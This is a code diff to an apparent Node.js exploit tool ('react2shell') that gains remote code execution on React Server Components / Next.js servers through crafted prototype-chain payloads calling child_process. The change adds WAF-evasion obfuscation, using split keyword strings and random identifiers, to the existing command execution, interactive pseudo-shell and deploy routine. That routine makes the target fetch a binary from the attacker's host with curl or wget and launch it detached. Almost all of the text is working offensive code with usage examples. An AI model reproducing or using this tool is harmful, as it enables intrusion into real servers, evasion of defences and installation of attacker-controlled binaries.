@@ -61,8 +61,6 @@ function rcePayload(command, { blind = false } = {}) {
 }
 
 function spawnPayload(command) {
-  // sh -c so args with spaces, pipes, redirects all work
-  // detached + unref so the process survives the 5s execSync timeout
   const lit = JSON.stringify(command);
 
   const prefix = [
@@ -70,6 +68,76 @@ function spawnPayload(command) {
     `var p=cp.spawn('sh',['-c',${lit}],{detached:true,stdio:'ignore'});`,
     `p.unref();`,
     `throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'spawned pid '+p.pid});`,
+  ].join("");
+
+  return JSON.stringify({
+    then: "$1:__proto__:then",
+    status: "resolved_model",
+    reason: -1,
+    value: '{"then":"$B0"}',
+    _response: {
+      _prefix: prefix,
+      _formData: { get: "$1:constructor:constructor" },
+    },
+  });
+}
+
+// -- waf bypass payload ----------------------------------------------------
+
+function randId() {
+  const alpha = "abcdefghijklmnopqrstuvwxyz";
+  const alnum = alpha + "0123456789";
+  let id = alpha[Math.floor(Math.random() * alpha.length)];
+  for (let i = 0; i < 2; i++)
+    id += alnum[Math.floor(Math.random() * alnum.length)];
+  return id;
+}
+
+function splitK(s) {
+  const i = 1 + Math.floor(Math.random() * (s.length - 2));
+  return `'${s.slice(0, i)}'+'${s.slice(i)}'`;
+}
+
+function rcePayloadBypass(command, { blind = false } = {}) {
+  const lit = JSON.stringify(command);
+  const [a, b, d] = [randId(), randId(), randId()];
+
+  const prefix = blind
+    ? [
+        `var ${a}=process[${splitK("mainModule")}];`,
+        `${a}[${splitK("require")}](${splitK("child_process")})`,
+        `[${splitK("execSync")}](${lit});`,
+      ].join("")
+    : [
+        `var ${a}=process[${splitK("mainModule")}];`,
+        `var ${b}=${a}[${splitK("require")}](${splitK("child_process")});`,
+        `var ${d}=${b}[${splitK("execSync")}](${lit},{timeout:5000}).toString().trim();`,
+        `throw Object.assign(new Error('NEXT_REDIRECT'),{digest:\`\${${d}}\`});`,
+      ].join("");
+
+  return JSON.stringify({
+    then: "$1:__proto__:then",
+    status: "resolved_model",
+    reason: -1,
+    value: '{"then":"$B0"}',
+    _response: {
+      _prefix: prefix,
+      _chunks: "$Q2",
+      _formData: { get: "$1:constructor:constructor" },
+    },
+  });
+}
+
+function spawnPayloadBypass(command) {
+  const lit = JSON.stringify(command);
+  const [a, b] = [randId(), randId()];
+
+  const prefix = [
+    `var ${a}=process[${splitK("mainModule")}]`,
+    `[${splitK("require")}](${splitK("child_process")});`,
+    `var ${b}=${a}[${splitK("spawn")}]('sh',['-c',${lit}],{detached:true,stdio:'ignore'});`,
+    `${b}.unref();`,
+    `throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'spawned pid '+${b}.pid});`,
   ].join("");
 
   return JSON.stringify({
@@ -159,7 +227,9 @@ function digest(text) {
 // -- exec / spawn ----------------------------------------------------------
 
 async function exec(target, command, opts = {}) {
-  const payload = rcePayload(command, opts);
+  const payload = opts.wafBypass
+    ? rcePayloadBypass(command, opts)
+    : rcePayload(command, opts);
   info(`cmd: ${command}`);
 
   const resp = await send(target, payload);
@@ -181,9 +251,12 @@ async function exec(target, command, opts = {}) {
   return null;
 }
 
-async function execSpawn(target, command) {
+async function execSpawn(target, command, { wafBypass = false } = {}) {
   info(`spawn: ${command}`);
-  const resp = await send(target, spawnPayload(command));
+  const payload = wafBypass
+    ? spawnPayloadBypass(command)
+    : spawnPayload(command);
+  const resp = await send(target, payload);
   if (resp.error) {
     fail(`request: ${resp.error}`);
     return null;
@@ -238,11 +311,14 @@ async function deploy(target, opts) {
     lhost,
     servePort = 8888,
     remoteArgs = "",
+    wafBypass = false,
   } = opts;
+
+  const exOpts = { wafBypass };
 
   // 1 - detect platform
   info("1/4 detecting target");
-  const uname = await exec(target, "uname -sm");
+  const uname = await exec(target, "uname -sm", exOpts);
   if (!uname) {
     fail("platform detection failed");
     return false;
@@ -269,14 +345,16 @@ async function deploy(target, opts) {
   try {
     result = await exec(
       target,
-      dl(`curl -so ${remote} http://${lhost}:${servePort}/${fs.name}`)
+      dl(`curl -so ${remote} http://${lhost}:${servePort}/${fs.name}`),
+      exOpts
     );
 
     if (!result?.includes("ok")) {
       warn("curl failed, trying wget");
       result = await exec(
         target,
-        dl(`wget -qO ${remote} http://${lhost}:${servePort}/${fs.name}`)
+        dl(`wget -qO ${remote} http://${lhost}:${servePort}/${fs.name}`),
+        exOpts
       );
     }
   } finally {
@@ -292,7 +370,7 @@ async function deploy(target, opts) {
   // 4 - launch detached
   info("4/4 launching binary");
   const launchCmd = `${remote} ${remoteArgs}`.trim();
-  const pid = await execSpawn(target, launchCmd);
+  const pid = await execSpawn(target, launchCmd, { wafBypass });
 
   if (pid) {
     ok(pid);
@@ -309,8 +387,9 @@ async function deploy(target, opts) {
 
 // -- interactive -----------------------------------------------------------
 
-async function interactive(target) {
+async function interactive(target, { wafBypass = false } = {}) {
   ok("interactive mode (exit to quit)");
+  if (wafBypass) ok("waf-bypass enabled");
   console.log();
 
   const rl = createInterface({
@@ -329,7 +408,7 @@ async function interactive(target) {
     }
     if (["exit", "quit", "q"].includes(cmd.toLowerCase())) break;
 
-    const out = await exec(target, cmd);
+    const out = await exec(target, cmd, { wafBypass });
     if (out) {
       rule();
       console.log(out);
@@ -361,6 +440,7 @@ function usage() {
   -c, --command <cmd>      Execute command with output
   --blind                  Blind RCE (no output capture)
   -i, --interactive        Interactive pseudo-shell
+  --waf-bypass             Obfuscate payload to evade WAF filtering
 
   --deploy <binary>        Upload and execute a binary on the target
   --lhost <ip>             Your IP (auto-detected if omitted)
@@ -370,6 +450,9 @@ function usage() {
 Examples:
   # Command with output
   ./react2shell.mjs -t http://10.10.10.5:3000 -c "id"
+
+  # Bypass WAF filtering
+  ./react2shell.mjs -t http://10.10.10.5:3000 -c "id" --waf-bypass
 
   # Interactive shell
   ./react2shell.mjs -t http://10.10.10.5:3000 -i
@@ -402,6 +485,9 @@ function parseArgs(argv) {
         break;
       case "--blind":
         a.blind = true;
+        break;
+      case "--waf-bypass":
+        a.wafBypass = true;
         break;
       case "-i":
       case "--interactive":
@@ -445,6 +531,7 @@ async function main() {
   if (!target.startsWith("http")) target = `http://${target}`;
   target = target.replace(/\/+$/, "");
   info(`target: ${target}`);
+  if (args.wafBypass) ok("waf-bypass mode");
 
   if (args.deploy) {
     const lhost = args.lhost || localIp();
@@ -454,17 +541,21 @@ async function main() {
       lhost,
       servePort: args.servePort || 8888,
       remoteArgs: args.remoteArgs || "",
+      wafBypass: args.wafBypass,
     });
     process.exit(success ? 0 : 1);
   }
 
   if (args.interactive) {
-    await interactive(target);
+    await interactive(target, { wafBypass: args.wafBypass });
     process.exit(0);
   }
 
   if (args.command) {
-    const out = await exec(target, args.command, { blind: args.blind });
+    const out = await exec(target, args.command, {
+      blind: args.blind,
+      wafBypass: args.wafBypass,
+    });
     if (out) {
       console.log();
       rule();
